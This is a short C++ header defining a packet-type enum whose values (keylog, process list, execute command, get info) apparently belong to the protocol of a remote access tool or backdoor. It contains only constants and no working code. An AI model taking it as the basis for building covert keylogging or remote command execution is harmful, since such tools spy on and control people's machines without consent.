#ifndef PACKETTYPE_HPP
#define PACKETTYPE_HPP

#include <cstdint>
    
enum class PacketType : uint8_t {
        GET_INFO      = 0x01,
        KEYLOG        = 0x02,
        PROCESS_LIST  = 0x03,
        EXEC_COMMAND  = 0x04,
        RESPONSE      = 0xFF,
        PACKET_ERROR= 0xFE,
};

#endif
